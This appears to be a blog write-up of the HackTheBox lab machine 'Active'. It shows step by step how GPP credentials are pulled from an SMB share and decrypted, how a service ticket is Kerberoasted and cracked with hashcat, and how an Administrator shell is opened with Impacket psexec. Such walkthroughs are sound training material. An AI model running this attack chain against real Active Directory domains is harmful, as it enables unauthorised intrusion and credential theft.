---
layout: post
title: "HTB-Active"
categories: HTB-Active
---

![active](/assets/img/active/active1.png)


Active is a box from TJNull's OSCP list, its one of the HTB 'retired' list judged a bit more challenging than the OSCP
but good practice.
As always, nmap first...


<h3>Nmap</h3>
`nmap -sV -Pn -p- 10.10.10.100 |tee -a act.txt`

```

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-01 23:25:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49180/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows


```

Enum4linux, is a handy smb enumeration tool, the results here give us a springboard for further enumeration.

`enum4linux 10.10.10.100`

```

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available

```

More interesting information is found...

```

//10.10.10.100/Replication      Mapping: OK, Listing: OK

```


With some shares listed, we can use smbmap and smbclient to invstigate.

`smbmap -H 10.10.10.100` gives us a little more...

![smbmap](/assets/img/active/active-smbmap1.png)

We have the domain name confirmed as `active.htb` and so update the /etc/hosts file accordingly.

Smbclient is a good tool for manually enumerating the server, lets have a look at the Replication share...

`smbclient //10.10.10.100/Replication

![smbclient1](/assets/img/active/active-smbclient1.png)


Further digging leads to a file Groups.xml which we can retrieve with smbclient.

![smbclient-groupsxml](/assets/img/active/active-smbclient-groupsxml.png)

Groups.xml gives us some credentials

```

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```
userName="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

It looks like the account is not disabled, so we can try to use it, if we can decrypt it.


Its a 'group policy preferences' encryption, Kali has a handy tool to decrypt it.
gpp-decrypt works...

```

gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18

```
so...
`active.htb\SVC_TGS`
`GPPstillStandingStrong2k18`

we can try these creds in smbclient to see what else we can find...

`smbclient -U SVC_TGS //10.10.10.100/Users`

We can browse to and 'get' user.txt.

![usertxt](/assets/img/active/active-smbclient-usertxt.png)

<hr width="250" size="6">

Now I need to gain access and escalate privileges.

Fortunately Impacket has a set of tools that can help.

```

python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18

```

![getuserspn](/assets/img/active/active-getuserspn.png)

I copy the hash to textfile 'hash' and use hashcat with rockyou.txt to break it.

`hashcat -m 13100 hash.txt -a 0 /home/sassuwunnu/wordlists/rockyou.txt --force`

we get the password `Ticketmaster1968`

Before exploring other avenues of access, I quickly try the creds Administrator/Ticketmaster1968
with smbclient.

```

root@kali:~/HTB/vip/active# smbclient -UAdministrator //10.10.10.100/Users
Enter WORKGROUP\Administrator's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 15:39:20 2018
  ..                                 DR        0  Sat Jul 21 15:39:20 2018
  Administrator                       D        0  Mon Jul 16 11:14:21 2018
  All Users                         DHS        0  Tue Jul 14 06:06:44 2009
  Default                           DHR        0  Tue Jul 14 07:38:21 2009
  Default User                      DHS        0  Tue Jul 14 06:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 05:57:55 2009
  Public                             DR        0  Tue Jul 14 05:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 16:16:32 2018

                10459647 blocks of size 4096. 4925665 blocks available
smb: \> cd administrator
smb: \administrator\> cd desktop
smb: \administrator\desktop\> ls
  .                                  DR        0  Mon Jul 30 14:50:10 2018
  ..                                 DR        0  Mon Jul 30 14:50:10 2018
  desktop.ini                       AHS      282  Mon Jul 30 14:50:10 2018
  root.txt                            A       34  Sat Jul 21 16:06:07 2018

                10459647 blocks of size 4096. 4925665 blocks available
smb: \administrator\desktop\> get root.txt
getting file \administrator\desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \administrator\desktop\> exit

```

Looks like we didn't need to actually get a command shell on the target at all to retrieve the
user and root flags.


I can't just leave it there though, got to get a shell...

Again Impacket's tools make it simple in this situation.

```


python ~/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file GLVXXcRb.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service UXYD on 10.10.10.100.....
[*] Starting service UXYD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```



:)


